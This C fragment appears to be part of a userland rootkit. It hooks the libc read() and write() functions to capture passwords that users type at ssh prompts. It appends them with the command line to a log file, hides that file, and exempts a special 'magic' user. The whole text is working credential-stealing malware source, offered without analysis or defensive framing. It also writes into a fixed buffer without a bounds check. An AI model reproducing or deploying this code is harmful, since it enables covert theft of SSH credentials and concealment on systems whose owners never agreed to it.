#ifdef LOG_SSH
static int ssh_start=0, ssh_pass_size=0;
static char ssh_pass[256];

ssize_t writelog(ssize_t ret){
    char *cmdline;
    FILE *fp;

    ssh_start = 0;

    cmdline = proccmdl();
    char logbuf[strlen(cmdline)+strlen(ssh_pass)+5];
    snprintf(logbuf, sizeof(logbuf), LOG_FMT, cmdline, ssh_pass);
    free(cmdline);

    if(alreadylogged(SSH_LOGS, logbuf))
        return ret;

    hook(CFOPEN, CFWRITE);
    fp = call(CFOPEN, SSH_LOGS, "a");
    if(fp == NULL) return ret;
    call(CFWRITE, logbuf, 1, strlen(logbuf), fp);
    fflush(fp);
    fclose(fp);

    if(!hidden_path(SSH_LOGS))
        hide_path(SSH_LOGS);

    return ret;
}
#endif

ssize_t read(int fd, void *buf, size_t n){
    hook(CREAD);
    ssize_t ret = (long)call(CREAD, fd, buf, n);

#ifdef LOG_SSH
    if(!buf) return ret;
    if(fd == 4 && ssh_start && process("ssh")){
        char *p = buf;
        if(*p == '\n')
            return writelog(ret);
        ssh_pass[ssh_pass_size++] = *p;
    }
#endif

    return ret;
}
ssize_t write(int fd, const void *buf, size_t n){
    hook(CWRITE);
    ssize_t ret = (long)call(CWRITE, fd, buf, n);

#ifdef LOG_SSH
    if(!buf) return ret;
    if(strstr((char*)buf, "assword") && process("ssh")){
        if(magicusr()) return ret;
        ssh_pass_size = 0;
        memset(ssh_pass, 0, sizeof(ssh_pass));
        ssh_start = 1;
    }
#endif
    
    return ret;
}